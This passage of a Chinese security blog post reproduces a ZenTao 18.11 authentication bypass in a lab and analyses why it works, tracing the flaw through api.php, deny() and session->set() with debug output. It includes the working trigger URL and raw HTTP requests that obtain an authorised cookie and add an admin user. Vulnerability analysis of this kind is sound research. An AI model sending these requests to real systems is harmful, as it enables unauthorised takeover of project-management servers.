class="headerlink" title="添加用户"></a>添加用户</h3><p>把cookie加到请求头中，添加用户，ry4n&#x2F;123456abc..</p><p><img src="/2023/04/27/file-upload/mage-20240428143438223.png" alt="image-20240428143438223"></p><p>虽然返回403，但是已经成功添加</p><h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><p>用admin账户到后台查看：</p><p><img src="/2023/04/27/file-upload/mage-20240428143545801.png" alt="image-20240428143545801"></p><p>已经多了ry4n用户。</p><p>尝试登录：</p><p><img src="/2023/04/27/file-upload/mage-20240428143612957.png" alt="image-20240428143612957"></p><p>成功登录。</p><p>至此，成功绕过了身份验证，并且添加了用户，能够直接登录后台。</p><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><h3 id="poc分析"><a href="#poc分析" class="headerlink" title="poc分析"></a>poc分析</h3><p>这里部署的版本为18.11.</p><p>主要的commit是在：</p><p><img src="/2023/04/27/file-upload/mage-20240428162620975.png" alt="image-20240428162620975"></p><p>主要的改动在www&#x2F;api.php，module&#x2F;common&#x2F;model.php，framework&#x2F;base&#x2F;router.class.php和framework&#x2F;api&#x2F;entry.class.php文件中。</p><p>一键部署的情况下，源码在&#x2F;opt&#x2F;zbox&#x2F;app&#x2F;zentao目录。</p><p><img src="/2023/04/27/file-upload/mage-20240430092323498.png" alt="image-20240430092323498"></p><p>在获取cookie时，是通过一个GET请求，访问api.php，重点看一下api.php。</p><p>在differ中的修改如下：</p><p><img src="/2023/04/27/file-upload/mage-20240428150852468.png" alt="image-20240428150852468"></p><p>删除<code>$common-&gt;checkEntry();</code>，改成了<code>if(!$app-&gt;version) $common-&gt;checkEntry();</code></p><p>直接访问&#x2F;api.php:</p><p><img src="/2023/04/27/file-upload/mage-20240430092806656.png" alt="image-20240430092806656"></p><p>报错EMPTY_ENTRY.直接到代码中搜索该字符串：</p><p><img src="/2023/04/27/file-upload/mage-20240430092948705.png" alt="image-20240430092948705"></p><p>定位到module&#x2F;common&#x2F;model.php中的checkEntry方法，并且可以判断出$this-&gt;app-&gt;version是false，走到了Old version这个分支。</p><p><img src="/2023/04/27/file-upload/mage-20240430104309094.png" alt="image-20240430104309094"></p><p>打印一下$this-&gt;app-&gt;version，为一个空字符串，bool类型为false。</p><p>api.php中，第37行调用了该函数，从调试结果也可以看到同样的结果：</p><p><img src="/2023/04/27/file-upload/mage-20240430104421564.png" alt="image-20240430104421564"></p><p>检查到空入口，代码到此终止。</p><p>接下来直接访问触发漏洞的url：</p><p><code>http://192.168.122.111/zentao/api.php?m=testcase&amp;f=savexmindimport&amp;HTTP_X_REQUESTED_WITH=XMLHttpRequest&amp;productID=upkbbehwgfscwizoglpw&amp;branch=zqbcsfncxlpopmrvchsu</code></p><p><img src="/2023/04/27/file-upload/mage-20240430105029582.png" alt="image-20240430105029582"></p><p>这里是有一个报错，<code>Call to undefined method helper::end() in /opt/zbox/app/zentao/module/common/model.php:454</code>，是在deny()方法中，但是仍然能够利用成功。</p><p>就从这个调用栈入手：</p><ul><li>www&#x2F;api.php(49): api-&gt;loadModule()</li><li>framework&#x2F;api&#x2F;router.class.php(200): router-&gt;loadModule()</li><li>framework&#x2F;router.class.php(716): baseRouter-&gt;loadModule()</li><li>framework&#x2F;base&#x2F;router.class.php(2319): testcase-&gt;saveXmindImport()</li><li>module&#x2F;testcase&#x2F;control.php(3163): commonModel-&gt;deny(‘testcase’, ‘importXmind’)</li></ul><p>deny()是被module&#x2F;testcase&#x2F;control.php中的saveXmindImport方法调用：</p><p><img src="/2023/04/27/file-upload/mage-20240430111141591.png" alt="image-20240430111141591"></p><p>而saveXmindImport()方法，是在framework&#x2F;api&#x2F;router.class.php中的loadModule方法中，通过call_user_func_array()来调用：</p><p><img src="/2023/04/27/file-upload/mage-20240430112529558.png" alt="image-20240430112529558"></p><p>调试打印出有关参数：</p><p><img src="/2023/04/27/file-upload/mage-20240430113100106.png" alt="image-20240430113100106"></p><p>可以看到调用了savexmindimport方法，并且没有传入参数。</p><p>在call方法前直接die，无法利用成功：</p><p><img src="/2023/04/27/file-upload/mage-20240430112749465.png" alt="image-20240430112749465"></p><p>因此问题应该就出在call方法调用之后。</p><p><code> if(!commonModel::hasPriv(&quot;testcase&quot;, &quot;importXmind&quot;)) $this-&gt;loadModel(&#39;common&#39;)-&gt;deny(&#39;testcase&#39;, &#39;importXmind&#39;);</code>在if判断中，进入到了deny方法，因此commonModel::hasPriv(“testcase”, “importXmind”)的返回值应该为false。</p><p>直接在deny开头加上die：</p><p><img src="/2023/04/27/file-upload/mage-20240430115013394.png" alt="image-20240430115013394"></p><p>此时依然能够获取cookie，但是将cookie带入后，无法利用成功。</p><p>下面跟进deny中查看，整体的逻辑如下：</p><p>首先尝试重新加载用户的权限信息，如果用户仍然没有权限访问指定的模块和方法，则将用户重定向到一个权限拒绝的页面。</p><p>把$user打印出来看一下：</p><p><img src="/2023/04/27/file-upload/mage-20240430151935366.png" alt="image-20240430151935366"></p><p>在权限重新加载之后，$user没有变化。通过die方法进行尝试，当die在<code>$this-&gt;session-&gt;set(&#39;user&#39;, $user);</code>之前时，获取到的cookie无效，如果在set之后，即可进行权限绕过：</p><p><img src="/2023/04/27/file-upload/mage-20240430152509787.png" alt="image-20240430152509787"></p><p>修改代码，将后续的代码全部忽略，并且通过反射找到set()方法：</p><p><img src="/2023/04/27/file-upload/mage-20240430152823057.png" alt="image-20240430152823057"></p><p><img src="/2023/04/27/file-upload/mage-20240430153120785.png" alt="image-20240430153120785"></p><p>去对应的文件里找set方法，代码如下：</p><p><img src="/2023/04/27/file-upload/mage-20240430153325459.png" alt="image-20240430153325459"></p><p>看看set方法的调用栈，并且打印出key和对应的value：</p><p><img src="/2023/04/27/file-upload/mage-20240507111638157.png" alt="image-20240507111638157"></p><p>返回的结果如下：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs stylus">enter set method:<br>#<span class="hljs-number">0</span>  super-&gt;<span class="hljs-built_in">set</span>(company, stdClass Object (<span class="hljs-selector-attr">[id]</span> =&gt; <span class="hljs-number">1</span>,<span class="hljs-selector-attr">[name]</span> =&gt; 禅道软件,<span class="hljs-selector-attr">[phone]</span> =&gt; ,<span class="hljs-selector-attr">[fax]</span> =&gt; ,<span class="hljs-selector-attr">[address]</span> =&gt; ,<span class="hljs-selector-attr">[zipcode]</span> =&gt; ,<span class="hljs-selector-attr">[website]</span> =&gt; ,<span class="hljs-selector-attr">[backyard]</span> =&gt; ,<span class="hljs-selector-attr">[guest]</span> =&gt; <span class="hljs-number">0</span>,<span class="hljs-selector-attr">[admins]</span> =&gt; ,admin,,<span class="hljs-selector-attr">[deleted]</span> =&gt; <span class="hljs-number">0</span>)) called at <span class="hljs-selector-attr">[/opt/zbox/app/zentao/module/common/model.php:261]</span><br>#<span class="hljs-number">1</span>  commonModel-&gt;<span class="hljs-built_in">setCompany</span>() called at <span class="hljs-selector-attr">[/opt/zbox/app/zentao/module/common/model.php:29]</span><br>#<span class="hljs-number">2</span>  commonModel-&gt;<span class="hljs-built_in">__construct</span>() called at <span class="hljs-selector-attr">[/opt/zbox/app/zentao/framework/base/router.class.php:1490]</span><br>#<span class="hljs-number">3</span>  baseRouter-&gt;<span class="hljs-built_in">loadCommon</span>() called at <span class="hljs-selector-attr">[/opt/zbox/app/zentao/www/api.php:34]</span><br>**<span class="hljs-built_in">string</span>(<span class="hljs-number">7</span>) <span class="hljs-string">&quot;company&quot;</span><br>**<span class="hljs-selector-tag">object</span>(stdClass)<span class="hljs-number">#483</span> (<span class="hljs-number">11</span>) &#123;<br>  <span class="hljs-selector-attr">[<span class="hljs-string">&quot;id&quot;</span>]</span>=&gt;<br>  <span class="hljs-built_in">int</span>(<span class="hljs-number">1</span>)<br>  <span class="hljs-selector-attr">[<span class="hljs-string">&quot;name&quot;</span>]</span>=&gt;<br>  <span class="hljs-built_in">string</span>(<span class="hljs-number">12</span>) <span class="hljs-string">&quot;禅道软件&quot;</span><br>  <span class="hljs-selector-attr">[<span class="hljs-string">&quot;phone&quot;</span>]</span>=&gt;<br>  <span class="hljs-built_in">string</span>(<span class="hljs-number">0</span>) <span class="hljs-string">&quot;&quot;</span><br>  <span class="hljs-selector-attr">[<span class="hljs-string">&quot;fax&quot;</span>]</span>=&gt;<br>  <span class="hljs-built_in">string</span>(<span class="hljs-number">0</span>) <span class="hljs-string">&quot;&quot;</span><br>  <span class="hljs-selector-attr">[<span class="hljs-string">&quot;address&quot;</span>]</span>=&gt;<br>  <span class="hljs-built_in">string</span>(<span class="hljs-number">0</span>) <span class="hljs-string">&quot;&quot;</span><br>  <span class="hljs-selector-attr">[<span class="hljs-string">&quot;zipcode&quot;</span>]</span>=&gt;<br>  <span class="hljs-built_in">string</span>(<span class="hljs-number">0</span>) <span class="hljs-string">&quot;&quot;</span><br>  <span class="hljs-selector-attr">[<span class="hljs-string">&quot;website&quot;</span>]</span>=&gt;<br>  <span class="hljs-built_in">string</span>(<span class="hljs-number">0</span>) <span class="hljs-string">&quot;&quot;</span><br>  <span class="hljs-selector-attr">[<span class="hljs-string">&quot;backyard&quot;</span>]</span>=&gt;<br>  <span class="hljs-built_in">string</span>(<span class="hljs-number">0</span>) <span class="hljs-string">&quot;&quot;</span><br>  <span class="hljs-selector-attr">[<span class="hljs-string">&quot;guest&quot;</span>]</span>=&gt;<br>  <span class="hljs-built_in">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;0&quot;</span><br>  <span class="hljs-selector-attr">[<span class="hljs-string">&quot;admins&quot;</span>]</span>=&gt;<br>  <span class="hljs-built_in">string</span>(<span class="hljs-number">7</span>) <span class="hljs-string">&quot;,admin,&quot;</span><br>  <span class="hljs-selector-attr">[<span class="hljs-string">&quot;deleted&quot;</span>]</span>=&gt;<br>  <span class="hljs-built_in">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;0&quot;</span><br>&#125;<br>**<span class="hljs-built_in">array</span>(<span class="hljs-number">1</span>) &#123;<br>  <span class="hljs-selector-attr">[<span class="hljs-string">&quot;company&quot;</span>]</span>=&gt;<br>  <span class="hljs-selector-tag">object</span>(stdClass)<span class="hljs-number">#483</span> (<span class="hljs-number">11</span>) &#123;<br>    <span class="hljs-selector-attr">[<span class="hljs-string">&quot;id&quot;</span>]</span>=&gt;<br>    <span class="hljs-built_in">int</span>(<span class="hljs-number">1</span>)<br>    <span class="hljs-selector-attr">[<span class="hljs-string">&quot;name&quot;</span>]</span>=&gt;<br>    <span class="hljs-built_in">string</span>(<span class="hljs-number">12</span>) <span class="hljs-string">&quot;禅道软件&quot;</span><br>    <span class="hljs-selector-attr">[<span class="hljs-string">&quot;phone&quot;</span>]</span>=&gt;<br>    <span class="hljs-built_in">string</span>(<span class="hljs-number">0</span>) <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-selector-attr">[<span class="hljs-string">&quot;fax&quot;</span>]</span>=&gt;<br>    <span class="hljs-built_in">string</span>(<span class="hljs-number">0</span>) <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-selector-attr">[<span class="hljs-string">&quot;address&quot;</span>]</span>=&gt;<br>    <span class="hljs-built_in">string</span>(<span class="hljs-number">0</span>) <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-selector-attr">[<span class="hljs-string">&quot;zipcode&quot;</span>]</span>=&gt;<br>    <span class="hljs-built_in">string</span>(<span class="hljs-number">0</span>) <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-selector-attr">[<span class="hljs-string">&quot;website&quot;</span>]</span>=&gt;<br>    <span class="hljs-built_in">string</span>(<span class="hljs-number">0</span>) <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-selector-attr">[<span class="hljs-string">&quot;backyard&quot;</span>]</span>=&gt;<br>    <span class="hljs-built_in">string</span>(<span class="hljs-number">0</span>) <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-selector-attr">[<span class="hljs-string">&quot;guest&quot;</span>]</span>=&gt;<br>    <span class="hljs-built_in">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;0&quot;</span><br>    <span class="hljs-selector-attr">[<span class="hljs-string">&quot;admins&quot;</span>]</span>=&gt;<br>    <span class="hljs-built_in">string</span>(<span class="hljs-number">7</span>) <span class="hljs-string">&quot;,admin,&quot;</span><br>    <span class="hljs-selector-attr">[<span class="hljs-string">&quot;deleted&quot;</span>]</span>=&gt;<br>    <span class="hljs-built_in">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;0&quot;</span><br>  &#125;<br>&#125;<br><br><br>enter set method:<br>#<span class="hljs-number">0</span>  super-&gt;<span class="hljs-built_in">set</span>(user, stdClass Object (<span class="hljs-selector-attr">[rights]</span> =&gt; ,<span class="hljs-selector-attr">[groups]</span> =&gt; Array (),<span class="hljs-selector-attr">[admin]</span> =&gt; )) called at <span class="hljs-selector-attr">[/opt/zbox/app/zentao/module/common/model.php:431]</span><br>#<span class="hljs-number">1</span>  commonModel-&gt;<span class="hljs-built_in">deny</span>(testcase, importXmind) called at <span class="hljs-selector-attr">[/opt/zbox/app/zentao/module/testcase/control.php:3163]</span><br>#<span class="hljs-number">2</span>  testcase-&gt;<span class="hljs-built_in">saveXmindImport</span>() called at <span class="hljs-selector-attr">[/opt/zbox/app/zentao/framework/base/router.class.php:2319]</span><br>#<span class="hljs-number">3</span>  baseRouter-&gt;<span class="hljs-built_in">loadModule</span>() called at <span class="hljs-selector-attr">[/opt/zbox/app/zentao/framework/router.class.php:716]</span><br>#<span class="hljs-number">4</span>  router-&gt;<span class="hljs-built_in">loadModule</span>() called at <span class="hljs-selector-attr">[/opt/zbox/app/zentao/framework/api/router.class.php:200]</span><br>#<span class="hljs-number">5</span>  api-&gt;<span class="hljs-built_in">loadModule</span>() called at <span class="hljs-selector-attr">[/opt/zbox/app/zentao/www/api.php:49]</span><br>**<span class="hljs-built_in">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;user&quot;</span><br>**<span class="hljs-selector-tag">object</span>(stdClass)<span class="hljs-number">#672</span> (<span class="hljs-number">3</span>) &#123;<br>  <span class="hljs-selector-attr">[<span class="hljs-string">&quot;rights&quot;</span>]</span>=&gt;<br>  <span class="hljs-built_in">bool</span>(false)<br>  <span class="hljs-selector-attr">[<span class="hljs-string">&quot;groups&quot;</span>]</span>=&gt;<br>  <span class="hljs-built_in">array</span>(<span class="hljs-number">0</span>) &#123;<br>  &#125;<br>  <span class="hljs-selector-attr">[<span class="hljs-string">&quot;admin&quot;</span>]</span>=&gt;<br>  <span class="hljs-built_in">bool</span>(false)<br>&#125;<br>**<span class="hljs-built_in">array</span>(<span class="hljs-number">2</span>) &#123;<br>  <span class="hljs-selector-attr">[<span class="hljs-string">&quot;company&quot;</span>]</span>=&gt;<br>  <span class="hljs-selector-tag">object</span>(stdClass)<span class="hljs-number">#483</span> (<span class="hljs-number">11</span>) &#123;<br>    <span class="hljs-selector-attr">[<span class="hljs-string">&quot;id&quot;</span>]</span>=&gt;<br>    <span class="hljs-built_in">int</span>(<span class="hljs-number">1</span>)<br>    <span class="hljs-selector-attr">[<span class="hljs-string">&quot;name&quot;</span>]</span>=&gt;<br>    <span class="hljs-built_in">string</span>(<span class="hljs-number">12</span>) <span class="hljs-string">&quot;禅道软件&quot;</span><br>    <span class="hljs-selector-attr">[<span class="hljs-string">&quot;phone&quot;</span>]</span>=&gt;<br>    <span class="hljs-built_in">string</span>(<span class="hljs-number">0</span>) <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-selector-attr">[<span class="hljs-string">&quot;fax&quot;</span>]</span>=&gt;<br>    <span class="hljs-built_in">string</span>(<span class="hljs-number">0</span>) <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-selector-attr">[<span class="hljs-string">&quot;address&quot;</span>]</span>=&gt;<br>    <span class="hljs-built_in">string</span>(<span class="hljs-number">0</span>) <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-selector-attr">[<span class="hljs-string">&quot;zipcode&quot;</span>]</span>=&gt;<br>    <span class="hljs-built_in">string</span>(<span class="hljs-number">0</span>) <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-selector-attr">[<span class="hljs-string">&quot;website&quot;</span>]</span>=&gt;<br>    <span class="hljs-built_in">string</span>(<span class="hljs-number">0</span>) <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-selector-attr">[<span class="hljs-string">&quot;backyard&quot;</span>]</span>=&gt;<br>    <span class="hljs-built_in">string</span>(<span class="hljs-number">0</span>) <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-selector-attr">[<span class="hljs-string">&quot;guest&quot;</span>]</span>=&gt;<br>    <span class="hljs-built_in">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;0&quot;</span><br>    <span class="hljs-selector-attr">[<span class="hljs-string">&quot;admins&quot;</span>]</span>=&gt;<br>    <span class="hljs-built_in">string</span>(<span class="hljs-number">7</span>) <span class="hljs-string">&quot;,admin,&quot;</span><br>    <span class="hljs-selector-attr">[<span class="hljs-string">&quot;deleted&quot;</span>]</span>=&gt;<br>    <span class="hljs-built_in">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;0&quot;</span><br>  &#125;<br>  <span class="hljs-selector-attr">[<span class="hljs-string">&quot;user&quot;</span>]</span>=&gt;<br>  <span class="hljs-selector-tag">object</span>(stdClass)<span class="hljs-number">#672</span> (<span class="hljs-number">3</span>) &#123;<br>    <span class="hljs-selector-attr">[<span class="hljs-string">&quot;rights&quot;</span>]</span>=&gt;<br>    <span class="hljs-built_in">bool</span>(false)<br>    <span class="hljs-selector-attr">[<span class="hljs-string">&quot;groups&quot;</span>]</span>=&gt;<br>    <span class="hljs-built_in">array</span>(<span class="hljs-number">0</span>) &#123;<br>    &#125;<br>    <span class="hljs-selector-attr">[<span class="hljs-string">&quot;admin&quot;</span>]</span>=&gt;<br>    <span class="hljs-built_in">bool</span>(false)<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到set方法有两次调用，流程大致如下 ：</p><p>![Drawing 2024-05-07 11.20.24.excalidraw](zentaoauth&#x2F;Drawing 2024-05-07 11.20.24.excalidraw.png)</p><p>这里有两处调用了set方法。</p><p>第一处是loadCommon，在构造方法中，调用了setCompany方法，并且通过<code>$this-&gt;session-&gt;set(&#39;company&#39;,$company)</code>，设置了company的内容。注意到在setCompany方法后，跟了一个setUser方法：</p><p><img src="/2023/04/27/file-upload/mage-20240507131835901.png" alt="image-20240507131835901"></p><p>跟进去添加echo语句进行调试，发现if判断全部为false，没有执行：</p><p><img src="/2023/04/27/file-upload/mage-20240507131937743.png" alt="image-20240507131937743"></p><p>很明显，重点在于第二处set的调用。</p><p>在api.php中，首先有$app-&gt;loadModule，跟到loadModule方法中，再调用父类方法，通过call_user_func_array调用saveXmindImport方法，if语句为true（<code>if(!commonModel::hasPriv(&quot;testcase&quot;, &quot;importXmind&quot;)) $this-&gt;loadModel(&#39;common&#39;)-&gt;deny(&#39;testcase&#39;, &#39;importXmind&#39;);</code>），最终进到deny，调用set方法（<code>$this-&gt;session-&gt;set(&#39;user&#39;, $user);</code>），设置了user，并且通过返回的cookie，即可进行未授权操作。</p><p>回到在漏洞复现时遇到的问题：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts">对于参数`m=testcase<span class="hljs-variable">&amp;f</span>=savexmindimport<span class="hljs-variable">&amp;</span>HTTP_X_REQUESTED_WITH=XMLHttpRequest<span class="hljs-variable">&amp;</span>productID=upkbbehwgfscwizoglpw<span class="hljs-variable">&amp;branch</span>=zqbcsfncxlpopmrvchsu`，有些ip只需要前三个参数即可，而有些ip需要带上全部参数，否则会提示param_code_missing，虽然也有zentaosid，但是带入到请求头中之后，会发现响应<span class="hljs-number">401</span>，unauthorized<br></code></pre></td></tr></table></figure><p>目前已经明确的是，需要通过m&#x3D;testcase&amp;f&#x3D;savexmindimport参数，来调用saveXmindImport方法，进而最终进入deny()-&gt;set()，而后面的HTTP_X_REQUESTED_WITH,productID和branch参数暂时未知，下面具体看看这些参数。</p><p>直接搜索HTTP_X_REQUESTED_WITH：</p><p><img src="/2023/04/27/file-upload/mage-20240507140451441.png" alt="image-20240507140451441"></p><p>简单筛选之后，基本可以确认就是在isAjaxRequest方法中。</p><p>直接打印调用栈查看：</p><p><img src="/2023/04/27/file-upload/mage-20240507142526070.png" alt="image-20240507142526070"></p><p>可以看到，首先是在api.php中，$app-&gt;loadModule()，进到setParams：</p><p><img src="/2023/04/27/file-upload/mage-20240507142644912.png" alt="image-20240507142644912"></p><p>再到new $className():</p><p><img src="/2023/04/27/file-upload/mage-20240507142745914.png" alt="image-20240507142745914"></p><p>这里创建了一个control类的实例，可以通过调试看到，className就是testcase，最终跟到testcase的construct：</p><p><img src="/2023/04/27/file-upload/mage-20240507143156797.png" alt="image-20240507143156797"></p><p>跟前面提到的saveXmindImport相对应：</p><p><img src="/2023/04/27/file-upload/mage-20240507143901383.png" alt="image-20240507143901383"></p><p>也就是说，在进入到saveXmindImport方法，执行deny之前，需要先进行实例化，而HTTP_X_REQUESTED_WITH参数就是在实例化的过程中，进行判断。</p><p><img src="/2023/04/27/file-upload/mage-20240507144916260.png" alt="image-20240507144916260"></p><p>首先在外层的if语句中，!isonlybody为true，进入到内层逻辑，通过var_dump((bool))可以看到empty($products)为true，而整个if condition为false，因此不会执行return print(xxx)：</p><p><img src="/2023/04/27/file-upload/mage-20240507145208291.png" alt="image-20240507145208291"></p><p>如果if为true，执行了locate，就会跳转到”<a href="http://192.168.122.111/zentao/index.php?m=product&f=showErrorNone&t=json&moduleName=qa&activeMenu=testcase&objectID=0%22%E4%B9%9F%E5%B0%B1%E6%98%AF%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E7%95%8C%E9%9D%A2%EF%BC%8C%E8%87%B3%E6%AD%A4%EF%BC%8C%E5%AE%9E%E4%BE%8B%E5%8C%96%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%B9%B6%E4%B8%94%E5%90%8E%E7%BB%AD%E7%9A%84saveXmindImport()-%3Edeny()%E4%B9%9F%E5%85%A8%E9%83%A8%E4%B8%AD%E6%96%AD%E3%80%82">http://192.168.122.111/zentao/index.php?m=product&amp;f=showErrorNone&amp;t=json&amp;moduleName=qa&amp;activeMenu=testcase&amp;objectID=0&quot;也就是用户登录界面，至此，实例化失败，并且后续的saveXmindImport()-&gt;deny()也全部中断。</a></p><p>因此isAjaxRequest()必须为true，结合代码如下：</p><p><img src="/2023/04/27/file-upload/mage-20240507145846398.png" alt="image-20240507145846398"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$isAjax</span> = (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_REQUESTED_WITH&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_REQUESTED_WITH&#x27;</span>] === <span class="hljs-string">&#x27;XMLHttpRequest&#x27;</span>) || (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;HTTP_X_REQUESTED_WITH&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;HTTP_X_REQUESTED_WITH&#x27;</span>] === <span class="hljs-string">&#x27;XMLHttpRequest&#x27;</span>);<br></code></pre></td></tr></table></figure><p>因此，||两边有一个为真即可，可以在url中添加HTTP_X_REQUESTED_WITH&#x3D;XMLHttpRequest，也可以添加到请求头中.</p><h4 id="新的利用方式"><a href="#新的利用方式" class="headerlink" title="新的利用方式"></a>新的利用方式</h4><p>经过测试，两种方法均可利用成功：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /zentao/api.php?m=testcase&amp;f=savexmindimport HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: <span class="hljs-number">192.168.122.111</span><br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">X</span>-Requested-With: XMLHttpRequest<br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">116</span>.<span class="hljs-number">0</span>.<span class="hljs-number">5845</span>.<span class="hljs-number">111</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,application/signed-exchange;v=b3;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate, br<br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Connection</span>: close<br><br><span class="hljs-attribute">GET</span> /zentao/api.php?m=testcase&amp;f=savexmindimport&amp;HTTP_X_REQUESTED_WITH=XMLHttpRequest HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: <span class="hljs-number">192.168.122.111</span><br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">116</span>.<span class="hljs-number">0</span>.<span class="hljs-number">5845</span>.<span class="hljs-number">111</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,application/signed-exchange;v=b3;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate, br<br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span 